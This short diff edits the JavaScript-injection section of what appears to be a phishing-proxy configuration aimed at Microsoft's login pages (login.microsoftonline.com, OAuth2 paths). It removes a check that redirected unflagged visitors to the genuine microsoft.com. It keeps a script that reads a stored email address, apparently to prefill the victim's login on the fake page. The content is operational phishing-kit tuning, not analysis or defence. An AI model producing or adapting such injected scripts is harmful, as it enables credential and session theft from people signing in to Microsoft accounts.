@@ -62,10 +62,7 @@ js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/common/oauth2/"]
     script: |
-      const dog = localStorage.getItem('everthingood');
-      if(!dog){
-        window.location.href = "https://www.microsoft.com/en-us/";
-      }
+      
       var aemail = "";
       const cat = localStorage.getItem('email');
       if(cat){
